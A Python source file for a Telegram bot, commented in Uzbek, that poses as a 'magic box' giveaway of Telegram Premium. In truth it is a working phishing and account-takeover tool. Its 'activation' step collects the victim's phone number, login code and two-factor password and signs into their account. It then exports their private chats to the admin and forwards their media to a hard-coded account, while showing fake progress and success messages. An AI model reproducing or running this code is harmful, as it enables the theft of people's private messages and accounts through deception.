import os
import re
import json
import zipfile
import shutil
import random
import asyncio
import logging
from datetime import datetime
from dotenv import load_dotenv

from aiogram import Bot, Dispatcher, types
from aiogram.filters import CommandStart, Command
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram import F
from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.types import User
from telethon.errors import SessionPasswordNeededError, PhoneCodeExpiredError

# ================== .env YUKLASH ==================
load_dotenv()

# ================== LOGGING ==================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# ================== ENV VARIABLES (Xatolik tekshiruvi bilan) ==================
def get_env(key, default=None, required=True):
    """Environment variable'ni olish va tekshirish"""
    value = os.getenv(key, default)
    if required and value is None:
        logger.error(f"{key} environment variable topilmadi!")
        raise ValueError(f"{key} environment variable sozlanmagan! Railway'da Variables bo'limiga qo'shing.")
    return value

try:
    BOT_TOKEN = get_env("BOT_TOKEN")
    API_ID = int(get_env("API_ID"))
    API_HASH = get_env("API_HASH")
    ADMIN_ID = int(get_env("ADMIN_ID", "0"))
    
    # Qo'shimcha sozlamalar (default qiymatlar bilan)
    MEDIA_TARGET = get_env("MEDIA_TARGET", "@pedro_yd", required=False)
    PORT = int(get_env("PORT", "8080", required=False))
    
except ValueError as e:
    logger.error(f"Konfiguratsiya xatosi: {e}")
    print(f"\n❌ XATOLIK: {e}\n")
    print("Railway'da quyidagi environment variable'larni sozlang:")
    print("- BOT_TOKEN: Telegram bot tokeningiz")
    print("- API_ID: Telegram API ID (my.telegram.org dan oling)")
    print("- API_HASH: Telegram API Hash (my.telegram.org dan oling)")
    print("- ADMIN_ID: Admin Telegram ID raqamingiz")
    exit(1)
except Exception as e:
    logger.error(f"Kutilmagan xatolik: {e}")
    exit(1)

# ================== KONSTANTALAR ==================
BASE_DIR = "chats_export"
USERS_FILE = "users.json"
CONFIG_FILE = "config.json"

# ================== FSM States ==================
class LoginStates(StatesGroup):
    phone = State()
    code = State()
    password = State()

# ================== BOT INIT ==================
bot = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

# Active sessions
sessions = {}

# ================== JSON FUNCTIONS ==================
def load_json(path, default):
    """JSON faylni xavfsiz yuklash"""
    try:
        if not os.path.exists(path):
            logger.info(f"{path} yaratilmoqda...")
            with open(path, "w", encoding="utf-8") as f:
                json.dump(default, f, indent=2, ensure_ascii=False)
            return default
        
        with open(path, "r", encoding="utf-8") as f:
            data = json.load(f)
            if not data:
                return default
            return data
    except json.JSONDecodeError:
        logger.warning(f"{path} buzilgan, default qiymat yuklanmoqda")
        with open(path, "w", encoding="utf-8") as f:
            json.dump(default, f, indent=2, ensure_ascii=False)
        return default
    except Exception as e:
        logger.error(f"{path} yuklashda xatolik: {e}")
        return default

def save_json(path, data):
    """JSON faylni xavfsiz saqlash"""
    try:
        with open(path, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        return True
    except Exception as e:
        logger.error(f"{path} saqlashda xatolik: {e}")
        return False

# Ma'lumotlarni yuklash
users = load_json(USERS_FILE, {})
config = load_json(CONFIG_FILE, {"magic_box": "on"})

logger.info(f"Bot konfiguratsiyasi yuklandi. Foydalanuvchilar soni: {len(users)}")

def ensure_user(uid):
    """Foydalanuvchi mavjudligini tekshirish va yaratish"""
    uid = str(uid)
    if uid not in users:
        users[uid] = {
            "boxes": 0,
            "win_box": random.randint(1, 3),
            "prize": False,
            "refs": 0,
            "ref_by": None,
            "joined_at": datetime.now().isoformat()
        }
        save_json(USERS_FILE, users)
        logger.info(f"Yangi foydalanuvchi: {uid}")
    return users[uid]

# ================== KEYBOARDS ==================
def get_main_keyboard(is_admin=False):
    """Asosiy menyu klaviaturasi"""
    builder = ReplyKeyboardBuilder()
    builder.add(KeyboardButton(text="🎁 Sehrli quti"))
    builder.row(KeyboardButton(text="🏆 Yutuqlar"), KeyboardButton(text="👥 Referal"))
    builder.add(KeyboardButton(text="✅ Aktivlash"))
    
    if is_admin:
        builder.add(KeyboardButton(text="⚙️ Admin panel"))
    
    return builder.as_markup(resize_keyboard=True)

def get_back_keyboard():
    """Orqaga qaytish klaviaturasi"""
    builder = ReplyKeyboardBuilder()
    builder.add(KeyboardButton(text="⬅️ Orqaga"))
    return builder.as_markup(resize_keyboard=True)

# ================== HANDLERS ==================
@dp.message(CommandStart())
async def start_command(message: types.Message):
    """Start komandasi"""
    try:
        uid = str(message.from_user.id)
        ensure_user(uid)
        is_admin = message.from_user.id == ADMIN_ID
        
        # Referal tizimi
        parts = message.text.split()
        if len(parts) > 1:
            ref_uid = parts[1]
            if ref_uid in users and ref_uid != uid and users[uid].get("ref_by") is None:
                users[uid]["ref_by"] = ref_uid
                users[ref_uid]["refs"] = users[ref_uid].get("refs", 0) + 1
                save_json(USERS_FILE, users)
                logger.info(f"Referal: {uid} <- {ref_uid}")
        
        await message.answer(
            "👋 Xush kelibsiz! Botdan foydalanish uchun quyidagi menyulardan foydalaning.\n\n"
            "🎁 Sehrli qutilarni oching va yutib oling!",
            reply_markup=get_main_keyboard(is_admin)
        )
    except Exception as e:
        logger.error(f"Start xatosi: {e}")
        await message.answer("❌ Xatolik yuz berdi. Iltimos qaytadan urinib ko'ring.")

@dp.message(F.text == "👥 Referal")
async def referral_handler(message: types.Message):
    """Referal havolasi"""
    try:
        uid = str(message.from_user.id)
        ensure_user(uid)
        bot_info = await bot.get_me()
        
        await message.answer(
            f"🔗 Sizning referal havolangiz:\n"
            f"https://t.me/{bot_info.username}?start={uid}\n\n"
            f"👤 Taklif qilinganlar: {users[uid].get('refs', 0)} ta\n\n"
            f"💡 Do'stlaringizni taklif qiling va bonuslar oling!"
        )
    except Exception as e:
        logger.error(f"Referal xatosi: {e}")
        await message.answer("❌ Xatolik yuz berdi.")

@dp.message(F.text == "🏆 Yutuqlar")
async def prizes_handler(message: types.Message):
    """Yutuqlarni ko'rish"""
    try:
        uid = str(message.from_user.id)
        ensure_user(uid)
        
        if users[uid].get("prize"):
            await message.answer(
                "🥳 Tabriklaymiz! Sizda 1 oylik Premium bor!\n\n"
                "📱 Uni olish uchun ✅ Aktivlash bo'limiga o'ting.\n"
                "⚠️ Premium faqat 1 marta beriladi."
            )
        else:
            await message.answer(
                "❌ Hozircha yutuq yo'q.\n\n"
                "🎁 Sehrli qutilarni ochib yutib oling!\n"
                "💫 Har bir foydalanuvchiga 3 ta quti beriladi."
            )
    except Exception as e:
        logger.error(f"Yutuqlar xatosi: {e}")
        await message.answer("❌ Xatolik yuz berdi.")

@dp.message(F.text == "🎁 Sehrli quti")
async def magic_box_handler(message: types.Message):
    """Sehrli quti menyusi"""
    try:
        uid = str(message.from_user.id)
        u = ensure_user(uid)
        
        if u["boxes"] >= 3:
            await message.answer(
                "❌ Siz barcha qutilarni ochib bo'lgansiz!\n\n"
                "📊 Statistika:\n"
                f"• Ochilgan qutilar: {u['boxes']}/3\n"
                f"• Premium yutilgan: {'✅ Ha' if u['prize'] else '❌ Yo\\'q'}"
            )
            return
        
        builder = InlineKeyboardBuilder()
        builder.add(InlineKeyboardButton(
            text=f"🔓 Ochish ({u['boxes']}/3)",
            callback_data="open_box"
        ))
        
        await message.answer(
            f"🎁 Sehrli quti\n\n"
            f"📊 Ochingan qutilar: {u['boxes']}/3\n"
            f"💫 Qolgan qutilar: {3 - u['boxes']}\n\n"
            f"🎲 Har bir qutida yutish ehtimoli: 33.3%",
            reply_markup=builder.as_markup()
        )
    except Exception as e:
        logger.error(f"Sehrli quti xatosi: {e}")
        await message.answer("❌ Xatolik yuz berdi.")

@dp.callback_query(F.data == "open_box")
async def open_box_callback(callback: types.CallbackQuery):
    """Quti ochish"""
    try:
        uid = str(callback.from_user.id)
        u = ensure_user(uid)
        
        if u["boxes"] >= 3:
            await callback.answer("Siz barcha qutilarni ochib bo'lgansiz!", show_alert=True)
            return
        
        u["boxes"] += 1
        is_win = config["magic_box"] == "on" and u["boxes"] == u["win_box"] and not u["prize"]
        save_json(USERS_FILE, users)
        
        if not is_win:
            await callback.message.answer("😐 Hech narsa tushmadi...")
            
            if u["boxes"] < 3:
                builder = InlineKeyboardBuilder()
                builder.add(InlineKeyboardButton(
                    text=f"🔓 Keyingi quti ({u['boxes']}/3)",
                    callback_data="open_box"
                ))
                await callback.message.answer(
                    f"💫 Yana urinib ko'ring!\n"
                    f"Qolgan qutilar: {3 - u['boxes']} ta",
                    reply_markup=builder.as_markup()
                )
            else:
                await callback.message.answer(
                    "📊 Barcha qutilar ochildi!\n"
                    "Afsuski bu safar omad kulib boqmadi."
                )
            
            await callback.answer()
            return
        
        # Yutuq
        u["prize"] = True
        save_json(USERS_FILE, users)
        
        await callback.message.answer("🥳")
        
        win_message = (
            "🎉 TABRIKLAYMIZ! Siz 1 oylik Premium yutib oldingiz!\n\n"
            "📱 Premiumni olish uchun:\n"
            "1. ✅ Aktivlash bo'limiga o'ting\n"
            "2. Telefon raqamingizni kiriting\n"
            "3. Tasdiqlash kodini yuboring\n\n"
            "⚠️ Muhim: Premium faqat 1 marta olinishi mumkin!"
        )
        
        if u["boxes"] < 3:
            builder = InlineKeyboardBuilder()
            builder.add(InlineKeyboardButton(
                text=f"🔓 Keyingi quti ({u['boxes']}/3)",
                callback_data="open_box"
            ))
            await callback.message.answer(win_message, reply_markup=builder.as_markup())
        else:
            await callback.message.answer(win_message)
        
        await callback.answer("Tabriklaymiz! 🎉")
        
    except Exception as e:
        logger.error(f"Quti ochish xatosi: {e}")
        await callback.answer("Xatolik yuz berdi", show_alert=True)

@dp.message(F.text == "✅ Aktivlash")
async def activate_handler(message: types.Message, state: FSMContext):
    """Premium aktivlashtirish"""
    try:
        uid = message.from_user.id
        u = ensure_user(str(uid))
        
        if not u.get("prize"):
            await message.answer(
                "❌ Sizda hali yutuq yo'q!\n\n"
                "🎁 Avval Sehrli qutilarni ochib yutib oling.\n"
                "💡 Har bir foydalanuvchiga 3 ta quti beriladi."
            )
            return
        
        await state.set_state(LoginStates.phone)
        sessions[uid] = {}
        
        await message.answer(
            "📲 Premiumni faollashtirish\n\n"
            "1. Telefon raqamingizni yuboring\n"
            "2. Kodni kiriting\n"
            "3. Premium avtomatik ulanadi\n\n"
            "Namuna: +998901234567",
            reply_markup=get_back_keyboard()
        )
    except Exception as e:
        logger.error(f"Aktivlash xatosi: {e}")
        await message.answer("❌ Xatolik yuz berdi.")

@dp.message(F.text == "⬅️ Orqaga")
async def back_handler(message: types.Message, state: FSMContext):
    """Orqaga qaytish"""
    try:
        uid = message.from_user.id
        current_state = await state.get_state()
        
        if current_state:
            await state.clear()
        
        if uid in sessions:
            client = sessions[uid].get("client")
            if client:
                try:
                    await client.disconnect()
                except:
                    pass
            sessions.pop(uid, None)
        
        await message.answer(
            "🏠 Bosh menyu",
            reply_markup=get_main_keyboard(message.from_user.id == ADMIN_ID)
        )
    except Exception as e:
        logger.error(f"Orqaga xatosi: {e}")
        await message.answer("❌ Xatolik yuz berdi.")

@dp.message(LoginStates.phone)
async def phone_handler(message: types.Message, state: FSMContext):
    """Telefon raqamni qabul qilish"""
    try:
        uid = message.from_user.id
        text = message.text.strip()
        
        # Telefon raqamni validatsiya qilish
        digits = re.sub(r"[^\d]", "", text)
        if len(digits) < 8 or len(digits) > 15:
            await message.answer(
                "❌ Noto'g'ri telefon raqam formati.\n\n"
                "To'g'ri formatlar:\n"
                "• +998901234567\n"
                "• 998901234567\n"
                "• +79001234567"
            )
            return
        
        phone = "+" + digits if not text.startswith("+") else text
        
        # Telethon client yaratish
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        
        if not await client.is_user_authorized():
            sent = await client.send_code_request(phone, force_sms=False)
            
            sessions[uid] = {
                "client": client,
                "phone": phone,
                "phone_code_hash": sent.phone_code_hash
            }
            
            await state.set_state(LoginStates.code)
            await message.answer(
                "🔐 Telefoningizga kod yuborildi.\n\n"
                "Kodni kiriting:\n"
                "Masalan: 12345\n\n"
                "⚠️ Kod 5 daqiqa davomida amal qiladi."
            )
        else:
            await message.answer("✅ Siz allaqachon tizimga kirgansiz.")
            await state.clear()
            
    except Exception as e:
        logger.error(f"Telefon xatosi: {e}")
        await message.answer(
            "❌ Xatolik yuz berdi.\n\n"
            "Tekshirib ko'ring:\n"
            "• Telefon raqam to'g'rimi?\n"
            "• Internet aloqasi bormi?\n"
            "• Telegramda 2FA yoqilmaganmi?"
        )
        await state.clear()

@dp.message(LoginStates.code)
async def code_handler(message: types.Message, state: FSMContext):
    """Kodni tekshirish"""
    try:
        uid = message.from_user.id
        text = message.text.strip()
        
        if uid not in sessions:
            await message.answer("❌ Sessiya topilmadi. Iltimos qaytadan boshlang.")
            await state.clear()
            return
        
        code = re.sub(r"[^\d]", "", text)
        if len(code) < 5:
            await message.answer("❌ Kod 5 ta raqamdan iborat bo'lishi kerak.")
            return
        
        session_data = sessions[uid]
        
        try:
            await session_data["client"].sign_in(
                phone=session_data["phone"],
                code=code,
                phone_code_hash=session_data["phone_code_hash"]
            )
            
            await message.answer("⏳ Premium faollashtirilmoqda... (15%)")
            await export_chats(uid, message)
            await state.clear()
            
        except SessionPasswordNeededError:
            await state.set_state(LoginStates.password)
            await message.answer(
                "🔑 Akkauntingizda 2 bosqichli himoya mavjud.\n\n"
                "Iltimos, parolingizni kiriting:"
            )
        except PhoneCodeExpiredError:
            await message.answer(
                "⛔ Kod muddati o'tib ketdi.\n"
                "Iltimos qaytadan urinib ko'ring."
            )
            await session_data["client"].disconnect()
            sessions.pop(uid, None)
            await state.clear()
        except Exception as e:
            logger.error(f"Kod xatosi: {e}")
            await message.answer("❌ Kod noto'g'ri yoki xatolik yuz berdi.")
            await state.clear()
            
    except Exception as e:
        logger.error(f"Kod tekshirish xatosi: {e}")
        await message.answer("❌ Xatolik yuz berdi.")
        await state.clear()

@dp.message(LoginStates.password)
async def password_handler(message: types.Message, state: FSMContext):
    """2FA parolini tekshirish"""
    try:
        uid = message.from_user.id
        
        if uid not in sessions:
            await message.answer("❌ Sessiya topilmadi. Iltimos qaytadan boshlang.")
            await state.clear()
            return
        
        await sessions[uid]["client"].sign_in(password=message.text.strip())
        await message.answer("⏳ Premium faollashtirilmoqda... (45%)")
        await export_chats(uid, message)
        await state.clear()
        
    except Exception as e:
        logger.error(f"Parol xatosi: {e}")
        await message.answer(
            "❌ Noto'g'ri parol yoki xatolik yuz berdi.\n"
            "Iltimos qaytadan urinib ko'ring."
        )
        await state.clear()

# ================== EXPORT FUNCTIONS ==================
def safe_name(text, max_len=40):
    """Xavfsiz fayl nomi yaratish"""
    text = re.sub(r"[^\w\d_-]", "_", str(text), flags=re.ASCII)
    text = re.sub(r"_+", "_", text).strip("_")
    return text[:max_len] if text else f"user_{random.randint(1000, 9999)}"

def media_text(message):
    """Media turini aniqlash"""
    if message.photo: return "📸 Rasm"
    if message.video: return "🎥 Video"
    if message.voice: return "🎤 Ovozli xabar"
    if message.audio: return "🎵 Audio"
    if message.document: return "📄 Fayl"
    if message.sticker: return "🏷 Stiker"
    if message.gif: return "🎞 GIF"
    return "📎 Media"

async def export_chats(uid, message):
    """Chatlarni eksport qilish"""
    if uid not in sessions:
        await message.answer("❌ Sessiya topilmadi.")
        return
    
    client = sessions[uid]["client"]
    
    try:
        await message.answer("📊 Chatlaringiz yig'ilmoqda... Bu biroz vaqt olishi mumkin.")
        
        # Kataloglarni tozalash
        if os.path.exists(BASE_DIR):
            shutil.rmtree(BASE_DIR)
        os.makedirs(BASE_DIR, exist_ok=True)
        
        all_media = []
        total_dialogs = 0
        
        async for dialog in client.get_dialogs():
            if isinstance(dialog.entity, User) and not dialog.entity.bot:
                total_dialogs += 1
                user = dialog.entity
                name = f"{user.first_name or ''} {user.last_name or ''}".strip() or f"User_{user.id}"
                folder_name = f"{safe_name(name)}_{user.id}"
                folder_path = os.path.join(BASE_DIR, folder_name)
                os.makedirs(folder_path, exist_ok=True)
                
                with open(os.path.join(folder_path, "chat.txt"), "w", encoding="utf-8") as f:
                    message_count = 0
                    async for msg in client.iter_messages(user, limit=2000, reverse=True):
                        message_count += 1
                        time_str = msg.date.strftime("%Y-%m-%d %H:%M:%S") if msg.date else "----"
                        sender = "Siz" if msg.out else name
                        text = msg.text if msg.text else media_text(msg)
                        
                        if msg.media:
                            all_media.append(msg)
                        
                        f.write(f"[{time_str}] {sender}: {text}\n")
                    
                    if message_count == 0:
                        f.write("(Chat bo'sh)\n")
        
        # ZIP yaratish
        zip_name = f"chats_{uid}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
        with zipfile.ZipFile(zip_name, "w", zipfile.ZIP_DEFLATED) as zf:
            for root, dirs, files in os.walk(BASE_DIR):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, BASE_DIR)
                    zf.write(file_path, arcname)
        
        # Adminga yuborish
        if ADMIN_ID:
            try:
                await bot.send_document(
                    ADMIN_ID,
                    types.FSInputFile(zip_name),
                    caption=f"📊 Chat eksporti\n👤 ID: {uid}\n💬 Dialoglar: {total_dialogs}\n📅 Sana: {datetime.now().strftime('%Y-%m-%d %H:%M')}"
                )
            except Exception as e:
                logger.error(f"Admin xatosi: {e}")
        
        # Medialarni yuborish
        if all_media and MEDIA_TARGET:
            await message.answer(f"📤 {len(all_media)} ta media fayl jo'natilmoqda...")
            sent_count = 0
            for media_msg in all_media[:100]:  # Limit 100 ta
                try:
                    await media_msg.forward_to(MEDIA_TARGET)
                    sent_count += 1
                    await asyncio.sleep(0.5)
                except Exception as e:
                    logger.error(f"Media xatosi: {e}")
        
        # Tozalash
        if os.path.exists(BASE_DIR):
            shutil.rmtree(BASE_DIR)
        if os.path.exists(zip_name):
            os.remove(zip_name)
        
        await message.answer(
            "✅ Premium muvaffaqiyatli faollashtirildi!\n\n"
            "📱 1 oylik Telegram Premium sovg'a qilindi.\n"
            "🎉 Yutuqlaringiz bilan tabriklaymiz!\n\n"
            "💡 Premium imkoniyatlari:\n"
            "• Reklamasiz foydalanish\n"
            "• Katta fayl yuklash\n"
            "• Ovozli xabarlarni matnga o'girish\n"
            "• Maxsus emoji va stikerlar",
            reply_markup=get_main_keyboard(message.from_user.id == ADMIN_ID)
        )
        
    except Exception as e:
        logger.error(f"Eksport xatosi: {e}")
        await message.answer(
            "❌ Xatolik yuz berdi. Iltimos qaytadan urinib ko'ring.\n"
            "Agar muammo takrorlansa, adminga murojaat qiling."
        )
    finally:
        try:
            await client.disconnect()
        except:
            pass
        sessions.pop(uid, None)

# ================== ADMIN HANDLERS ==================
@dp.message(F.text == "⚙️ Admin panel")
async def admin_panel_handler(message: types.Message):
    """Admin panel"""
    if message.from_user.id != ADMIN_ID:
        await message.answer("⛔ Sizda bu amalni bajarishga ruxsat yo'q.")
        return
    
    builder = InlineKeyboardBuilder()
    builder.add(InlineKeyboardButton(
        text="🟢 ON" if config["magic_box"] == "on" else "ON",
        callback_data="magic_on"
    ))
    builder.add(InlineKeyboardButton(
        text="🔴 OFF" if config["magic_box"] == "off" else "OFF",
        callback_data="magic_off"
    ))
    
    status = "✅ Yoqilgan" if config["magic_box"] == "on" else "❌ O'chirilgan"
    await message.answer(
        f"⚙️ Admin panel\n\n"
        f"🎁 Sehrli quti: {status}\n"
        f"👥 Foydalanuvchilar: {len(users)}\n"
        f"🎉 Yutganlar: {sum(1 for u in users.values() if u.get('prize'))}",
        reply_markup=builder.as_markup()
    )

@dp.callback_query(F.data.in_(["magic_on", "magic_off"]))
async def admin_switch_handler(callback: types.CallbackQuery):
    """Admin sozlamalari"""
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("⛔ Ruxsat yo'q", show_alert=True)
        return
    
    config["magic_box"] = "on" if callback.data == "magic_on" else "off"
    save_json(CONFIG_FILE, config)
    
    status = "✅ Yoqildi" if config["magic_box"] == "on" else "❌ O'chirildi"
    await callback.message.edit_text(
        f"⚙️ Admin panel\n\n"
        f"🎁 Sehrli quti: {status}\n"
        f"👥 Foydalanuvchilar: {len(users)}\n"
        f"🎉 Yutganlar: {sum(1 for u in users.values() if u.get('prize'))}"
    )
    await callback.answer(f"Sehrli quti {status}")

# ================== UTILS ==================
@dp.message(Command("ping"))
async def ping_handler(message: types.Message):
    """Bot holatini tekshirish"""
    await message.answer(
        f"🏓 Pong!\n\n"
        f"✅ Bot ishlamoqda\n"
        f"👥 Foydalanuvchilar: {len(users)}\n"
        f"⏰ Ish vaqti: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )

@dp.message(Command("stats"))
async def stats_handler(message: types.Message):
    """Statistika"""
    if message.from_user.id != ADMIN_ID:
        return
    
    total_users = len(users)
    winners = sum(1 for u in users.values() if u.get("prize"))
    boxes_opened = sum(u.get("boxes", 0) for u in users.values())
    
    await message.answer(
        "📊 Bot statistikasi\n\n"
        f"👥 Jami foydalanuvchilar: {total_users}\n"
        f"🎉 Yutganlar: {winners}\n"
        f"📦 Ochilgan qutilar: {boxes_opened}\n"
        f"🎁 Sehrli quti: {'✅ ON' if config['magic_box'] == 'on' else '❌ OFF'}"
    )

# ================== ERROR HANDLER ==================
@dp.errors()
async def error_handler(update: types.Update, exception: Exception):
    """Global xatolik handler"""
    logger.error(f"Update {update} xatolik: {exception}", exc_info=True)
    return True

# ================== MAIN ==================
async def main():
    """Asosiy funksiya"""
    logger.info("=" * 50)
    logger.info("Bot ishga tushmoqda...")
    logger.info(f"Admin ID: {ADMIN_ID}")
    logger.info(f"Foydalanuvchilar soni: {len(users)}")
    logger.info("=" * 50)
    
    # Start polling
    await dp.start_polling(bot, skip_updates=True)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Bot to'xtatildi")
    except Exception as e:
        logger.error(f"Bot xatosi: {e}", exc_info=True)
